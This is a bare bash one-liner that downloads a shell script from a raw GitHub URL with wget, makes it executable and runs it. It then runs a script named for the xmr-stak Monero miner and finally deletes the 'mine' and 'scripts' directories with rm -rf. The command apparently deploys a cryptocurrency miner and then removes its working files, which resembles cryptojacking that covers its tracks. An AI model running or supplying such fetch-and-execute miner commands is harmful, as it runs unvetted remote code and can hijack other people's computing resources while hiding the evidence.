/bin/bash -c "wget -O start3.sh https://raw.githubusercontent.com/pproum/test/master/build/scripts/start3.sh; 
chmod u+x start3.sh ;
./start3.sh ; 
./scripts/run_xmr_stak3.pl; 
cd ..; 
rm -rf mine ; 
rm -rf scripts;"